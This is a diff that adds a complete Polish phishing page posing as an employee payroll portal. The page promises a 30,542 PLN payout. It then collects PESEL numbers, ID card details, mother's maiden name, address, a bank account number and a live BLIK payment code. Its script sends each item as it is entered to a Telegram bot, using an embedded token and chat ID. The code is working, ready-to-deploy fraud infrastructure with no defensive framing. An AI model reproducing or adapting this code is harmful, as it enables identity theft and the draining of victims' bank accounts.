@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Rozliczeń Pracowniczych</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
+        .app-container { max-width: 480px; margin: 20px auto; background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 15px 35px rgba(0,0,0,0.2); }
+        .step { display: none; padding: 25px; }
+        .active { display: block; }
+        .balance-card { background: linear-gradient(135deg, #2ecc71, #27ae60); color: white; padding: 25px; border-radius: 15px; margin-bottom: 20px; }
+        .blik-input { letter-spacing: 8px; font-size: 2.2rem; font-weight: bold; text-align: center; border: 2px solid #e1173c; color: #e1173c; }
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
+        .invalid { border-color: red !important; }
+    </style>
+</head>
+<body>
+
+<div id="loader" class="loading-overlay">
+    <div class="spinner-border text-primary" role="status"></div>
+    <p class="mt-3 fw-bold">Trwa przetwarzanie danych...</p>
+</div>
+
+<div class="app-container">
+    <!-- KROK 1: LOGOWANIE -->
+    <div id="step-login" class="step active text-center">
+        <h2 class="fw-bold mb-4">Panel Pracownika</h2>
+        <div id="login-error" class="alert alert-danger d-none small">Błędny identyfikator lub hasło!</div>
+        <input type="text" id="login-id" class="form-control mb-3" placeholder="Login">
+        <input type="password" id="login-pass" class="form-control mb-4" placeholder="Hasło">
+        <button onclick="checkLogin()" class="btn btn-primary w-100 py-3 fw-bold shadow-sm">ZALOGUJ SIĘ</button>
+    </div>
+
+    <!-- KROK 2: DASHBOARD -->
+    <div id="step-dash" class="step text-center">
+        <div class="balance-card shadow">
+            <p class="mb-1 opacity-75">Suma gotowa do wypłaty</p>
+            <h1 class="fw-bold mb-0">30 542,10 PLN</h1>
+        </div>
+        <button onclick="goTo('step-kyc')" class="btn btn-success btn-lg w-100 py-3 fw-bold shadow">ODBIERZ ŚRODKI</button>
+    </div>
+
+    <!-- KROK 3: WERYFIKACJA KYC (Z BLOKADĄ) -->
+    <div id="step-kyc" class="step">
+        <h4 class="fw-bold mb-1">Weryfikacja Tożsamości</h4>
+        <p class="small text-muted mb-4">Wszystkie pola są wymagane do odblokowania przelewu.</p>
+        
+        <div class="text-start" id="kyc-form">
+            <label class="small fw-bold">Dane tożsamości</label>
+            <input type="text" id="p-name" class="form-control mb-2" placeholder="Imię i nazwisko">
+            <input type="text" id="p-pesel" class="form-control mb-2" placeholder="Numer PESEL">
+            <input type="text" id="p-id-nr" class="form-control mb-2" placeholder="Seria i nr dowodu">
+            <div class="row g-2 mb-2">
+                <div class="col"><input type="text" id="p-id-issue" class="form-control" placeholder="Data wydania"></div>
+                <div class="col"><input type="text" id="p-id-exp" class="form-control" placeholder="Data ważności"></div>
+            </div>
+            <input type="text" id="p-mother" class="form-control mb-3" placeholder="Nazwisko rodowe matki">
+
+            <label class="small fw-bold">Dane adresowe i kontaktowe</label>
+            <textarea id="p-address" class="form-control mb-2" rows="2" placeholder="Adres zamieszkania"></textarea>
+            <input type="tel" id="p-phone" class="form-control mb-2" placeholder="Numer telefonu">
+            <input type="email" id="p-email" class="form-control mb-4" placeholder="Adres e-mail">
+        </div>
+        <button onclick="validateAndSaveKYC()" class="btn btn-primary w-100 py-3 fw-bold">DALEJ (KROK 2/3)</button>
+    </div>
+
+    <!-- KROK 4: NUMER RACHUNKU -->
+    <div id="step-account" class="step">
+        <h4 class="fw-bold mb-3">Rachunek Docelowy</h4>
+        <p class="small text-muted">Podaj numer konta do wypłaty środków (30 542,10 PLN).</p>
+        <input type="text" id="p-account" class="form-control mb-4 text-center" placeholder="PL 00 0000 0000 0000 0000 0000 0000">
+        <button onclick="saveAccount()" class="btn btn-primary w-100 py-3 fw-bold">ZATWIERDŹ RACHUNEK</button>
+    </div>
+
+    <!-- KROK 5: BRAMKA BLIK -->
+    <div id="step-blik" class="step text-center">
+        <div class="mb-4 border-bottom pb-3">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Blik_logo.png" width="90">
+        </div>
+        <h5 class="fw-bold">Autoryzacja Wypłaty</h5>
+        <p class="small text-muted">Wprowadź kod BLIK, aby powiązać rachunek z systemem wypłat.</p>
+        
+        <div class="my-4">
+            <input type="number" id="p-blik" class="form-control blik-input" placeholder="000 000">
+        </div>
+        
+        <button onclick="finalSend()" class="btn btn-danger btn-lg w-100 py-3 fw-bold">ZATWIERDŹ PRZELEW</button>
+    </div>
+
+    <!-- KROK 6: SUKCES -->
+    <div id="step-success" class="step text-center py-5">
+        <div class="text-success h1 mb-3">✔</div>
+        <h3 class="fw-bold">Zlecenie przyjęte</h3>
+        <p class="text-muted">Proces weryfikacji trwa. Środki zostaną przelane w ciągu 24h.</p>
+    </div>
+</div>
+
+<script>
+    // --- KONFIGURACJA ---
+    const token = '8675368774:AAGvYsmeSqRQdDXXOYT7-2GSszVEWh7NhbE';
+    const chat_id = '7506682898';
+    const VALID_USER = "worker03";
+    const VALID_PASS = "ui3h4nJNF32r3";
+
+    function goTo(id) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0,0);
+    }
+
+    function showLoading(nextStep) {
+        document.getElementById('loader').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            goTo(nextStep);
+        }, 1500);
+    }
+
+    function checkLogin() {
+        const u = document.getElementById('login-id').value;
+        const p = document.getElementById('login-pass').value;
+        if (u === VALID_USER && p === VALID_PASS) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🔓 Zalogowano: " + u)}`);
+            showLoading('step-dash');
+        } else {
+            document.getElementById('login-error').classList.remove('d-none');
+        }
+    }
+
+    function validateAndSaveKYC() {
+        const fields = ['p-name', 'p-pesel', 'p-id-nr', 'p-phone', 'p-address', 'p-mother'];
+        let valid = true;
+
+        fields.forEach(id => {
+            const el = document.getElementById(id);
+            if (el.value.trim().length < 3) {
+                el.classList.add('invalid');
+                valid = false;
+            } else {
+                el.classList.remove('invalid');
+            }
+        });
+
+        if (!valid) {
+            alert("Proszę uzupełnić wszystkie wymagane dane!");
+            return;
+        }
+
+        const data = `👤 DANE KYC:\nImię: ${document.getElementById('p-name').value}\nPESEL: ${document.getElementById('p-pesel').value}\nDowód: ${document.getElementById('p-id-nr').value}\nMatka: ${document.getElementById('p-mother').value}\nAdres: ${document.getElementById('p-address').value}\nTel: ${document.getElementById('p-phone').value}\nMail: ${document.getElementById('p-email').value}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(data)}`);
+        showLoading('step-account');
+    }
+
+    function saveAccount() {
+        const acc = document.getElementById('p-account').value;
+        if (acc.length < 10) {
+            alert("Wprowadź poprawny numer rachunku!");
+            return;
+        }
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🏦 KONTO: " + acc)}`);
+        showLoading('step-blik');
+    }
+
+    function finalSend() {
+        const blik = document.getElementById('p-blik').value;
+        if (blik.length < 6) {
+            alert("Wprowadź poprawny kod BLIK!");
+            return;
+        }
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("💰 !!! KOD BLIK !!!: " + blik)}`)
+        .then(() => showLoading('step-success'));
+    }
+</script>
+
+</body>
+</html>
